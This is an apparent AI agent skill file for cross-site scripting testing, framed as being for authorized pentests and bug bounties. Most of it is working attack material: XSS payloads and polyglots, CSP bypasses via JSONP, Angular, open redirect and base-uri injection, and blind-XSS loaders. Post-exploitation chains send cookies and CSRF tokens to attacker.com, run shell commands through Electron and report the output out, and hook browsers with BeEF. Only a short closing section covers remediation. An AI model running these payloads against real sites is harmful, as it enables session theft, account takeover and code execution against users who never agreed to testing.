---
name: xss-specialist
description: Cross-site scripting specialist for authorized pentests and bug bounty — covers reflected, stored, DOM-based, mutation (mXSS), blind, and self-XSS; CSP bypass techniques (JSONP, Angular CDN, open redirect, nonce reuse, Trusted Types); dalfox/XSStrike/kxss/ezXSS toolchain; XSS attack chains (session hijack, CSRF, ATO, SSRF, Electron RCE). Use when testing for or exploiting XSS in web applications. Triggers on: XSS, cross-site scripting, CSP bypass, dalfox, XSStrike, blind XSS, DOM XSS, mutation XSS, reflected XSS, stored XSS, content security policy bypass.
---

# Skill: xss-specialist

## Trigger

Fire when the task involves:
- Detecting or exploiting any variant of XSS (reflected, stored, DOM, blind, mXSS)
- CSP analysis and bypass
- Post-XSS exploitation (session theft, ATO, BeEF modules)
- Setting up blind XSS infrastructure (ezXSS, xsshunter)
- Building automated XSS hunting pipelines
- XSS attack chain construction (XSS → CSRF, XSS → ATO, XSS → Electron RCE)

## Instructions

### Phase 1 — XSS Variant Identification

| Variant | Description | Detection signal |
|---------|-------------|-----------------|
| Reflected | Payload echoed in immediate response | Inject `">test123<"`, look for it in source |
| Stored | Payload persists and fires for other users | Submit payload; visit page as different user |
| DOM-based | Payload processed by client-side JS only | Source → sink in JS; no server round-trip |
| mXSS (Mutation) | Browser mutations bypass sanitizer | Payload mutates after DOMParser/innerHTML |
| Blind | Fires in an admin panel you cannot see | Out-of-band callback (ezXSS/xsshunter) |
| Self-XSS | Only fires for the victim themselves | Social engineering required |

### Phase 2 — Automated Hunting Pipeline

```bash
# Standard pipeline: crawl → reflect-filter → scan
gau target.com | grep "=" | uro | kxss | grep -oP 'url: \K\S+' | dalfox pipe \
  --blind https://your-ezxss.com/payload --silence

# Install toolchain:
go install github.com/lc/gau/v2/cmd/gau@latest         # URL harvesting
go install github.com/tomnomnom/uro@latest              # URL deduplication
go install github.com/Emoe/kxss@latest                  # reflection pre-filter
go install github.com/hahwul/dalfox/v2@latest           # XSS scanner

# hakrawler for crawling:
go install github.com/hakluke/hakrawler@latest
echo "https://target.com" | hakrawler | grep "=" | dalfox pipe --silence
```

### Phase 3 — dalfox (Primary Scanner)

```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# With custom headers (session cookies)
dalfox url "http://target.com/page?q=test" \
  -H "Cookie: session=abc123" \
  -H "Authorization: Bearer token"

# Blind XSS (fires payload with callback to your server)
dalfox url "http://target.com/?q=test" \
  --blind "https://your-ezxss.com/payload"

# Pipe mode (from kxss or other tools)
cat urls.txt | dalfox pipe --silence

# WAF bypass mode
dalfox url "http://target.com/?q=test" --waf-evasion

# Store mode (stored XSS — monitor callback later)
dalfox url "http://target.com/submit" -X POST -d "comment=FUZZ" \
  --blind "https://your-ezxss.com/payload"
```

### Phase 4 — XSStrike (Intelligent Payload Generation)

```bash
git clone https://github.com/s0md3v/XSStrike
pip3 install -r XSStrike/requirements.txt

# Reflected XSS
python3 XSStrike/xsstrike.py -u "http://target.com/page?q=test"

# DOM XSS crawl
python3 XSStrike/xsstrike.py -u "http://target.com/" --crawl --dom

# With fuzzer (finds more injection points)
python3 XSStrike/xsstrike.py -u "http://target.com/?q=test" --fuzzer

# Blind XSS
python3 XSStrike/xsstrike.py -u "http://target.com/?q=test" \
  --blind "https://your.ezxss.server/payload"
```

### Phase 5 — XSS Payload Taxonomy

**Universal polyglots (try these first)**
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

**Context-specific payloads**

*HTML attribute context*
```html
" onmouseover="alert(1)
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
```

*JavaScript string context*
```javascript
'; alert(1)//
\'; alert(1)//
</script><script>alert(1)</script>
```

*HTML tag body context*
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
```

*DOM sink context (document.write, innerHTML, eval)*
```javascript
// innerHTML sink
<img src=x onerror=alert(1)>

// document.write sink
<script>alert(1)</script>

// eval/Function sink
alert(1)//

// location.href sink
javascript:alert(1)
```

**Filter bypass variants**
```html
<ScRiPt>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x onerror=&#x61;lert(1)>
<img src=x onerror=\u0061lert(1)>
<a href="jAvAsCrIpT:alert(1)">x</a>
```

### Phase 6 — CSP Bypass Techniques (2026)

**Step 0 — Analyze CSP first**
```bash
# CSP Evaluator (authoritative)
npm install csp_evaluator
# Or: https://csp-evaluator.withgoogle.com/

# Check for: unsafe-inline, unsafe-eval, wildcard * sources, missing directives
```

**JSONP endpoint bypass (unsafe-dynamic + allowed CDN)**
```javascript
// Find JSONP endpoint on allowed domain:
// script-src: 'strict-dynamic' https://cdn.example.com
<script src="https://cdn.example.com/jsonp?callback=alert(1)//"></script>
// JSONBee: https://github.com/zigoo0/JSONBee — curated JSONP bypass endpoints
```

**Angular CDN bypass (if angular.js in script-src)**
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
<div ng-app ng-csp><div ng-include="'javascript:alert(1)'"></div></div>
```

**Open redirect bypass (script-src: *.trusted.com)**
```html
<script src="https://trusted.com/redirect?url=https://attacker.com/xss.js"></script>
```

**base-uri injection (missing base-uri directive)**
```html
<base href="https://attacker.com/">
<!-- All relative script-src paths now resolve to attacker.com -->
```

**Nonce reuse (if nonce is static / predictable)**
```html
<!-- If you find the nonce value anywhere else in the page -->
<script nonce="FOUND_NONCE">alert(1)</script>
```

**unsafe-inline + strict-dynamic confusion**
```
CSP: script-src 'unsafe-inline' 'strict-dynamic' https://cdn.example.com
→ strict-dynamic IGNORES 'unsafe-inline' in modern browsers
→ But older browsers fall back to unsafe-inline — target old browsers
```

### Phase 7 — Blind XSS Setup (ezXSS)

```bash
# Self-hosted ezXSS (Docker)
docker run -p 80:80 ssl/ezxss
# Configure in dashboard: set payload domain, email/Slack notifications

# Payloads to inject (ezXSS provides customized payload per domain):
"><script src=https://your.ezxss.com/payload></script>
'><script src=https://your.ezxss.com/payload></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://your.ezxss.com/payload\';document.body.appendChild(a)')

# Captures: cookies, localStorage, screenshot, DOM, referrer, victim IP
```

### Phase 8 — Post-XSS Attack Chains

**XSS → Session Hijack**
```javascript
// Exfil session cookie (HttpOnly=false required)
new Image().src="http://attacker.com/steal?c="+document.cookie
fetch("http://attacker.com/steal?c="+encodeURIComponent(document.cookie))
```

**XSS → CSRF (token exfil + form submission)**
```javascript
// Exfil CSRF token from page
var token = document.querySelector('input[name="csrf_token"]').value;
fetch("http://attacker.com/steal?t="+token);
// Then submit form with stolen token
var f=document.createElement('form');f.method='POST';f.action='/change-email';
var i=document.createElement('input');i.name='email';i.value='attacker@evil.com';
var c=document.createElement('input');c.name='csrf_token';c.value=token;
f.appendChild(i);f.appendChild(c);document.body.appendChild(f);f.submit();
```

**XSS → Electron RCE**
```javascript
// If nodeIntegration:true (old Electron apps)
require('child_process').exec('whoami', (e,s)=>fetch("http://attacker.com/?r="+s))
// If contextIsolation:false but nodeIntegration:false:
window.require('electron').shell.openExternal('http://attacker.com')
```

**BeEF (post-XSS exploitation framework)**
```bash
git clone https://github.com/beefproject/beef
cd beef && bundle install && ./beef
# Hook: <script src="http://attacker.com:3000/hook.js"></script>
# 300+ browser-side modules: keylogger, screenshot, internal network scan, etc.
```

### Phase 9 — Remediation

- Output encode ALL user-controlled data in the correct context (HTML entity, JS string, URL, CSS)
- Use DOMPurify for any HTML that must be rendered: `DOMPurify.sanitize(dirty)`
- Set HttpOnly + Secure + SameSite=Strict on session cookies
- Deploy strict CSP: `script-src 'strict-dynamic' 'nonce-{random}'; object-src 'none'; base-uri 'none'`
- Enable Trusted Types for DOM sink operations

## References

- hahwul/dalfox — https://github.com/hahwul/dalfox (Go, MIT)
- s0md3v/XSStrike — https://github.com/s0md3v/XSStrike (Python, MIT)
- Emoe/kxss — https://github.com/Emoe/kxss (Go)
- ssl/ezXSS — https://github.com/ssl/ezXSS (PHP, MIT)
- beefproject/beef — https://github.com/beefproject/beef
- swisskyrepo/PayloadsAllTheThings XSS section — https://github.com/swisskyrepo/PayloadsAllTheThings (MIT)
- google/csp-evaluator — https://github.com/google/csp-evaluator
- cure53/DOMPurify — https://github.com/cure53/DOMPurify (MIT)
- zigoo0/JSONBee — https://github.com/zigoo0/JSONBee
- Source report: xss-specter-deep-research-2026-10-27.md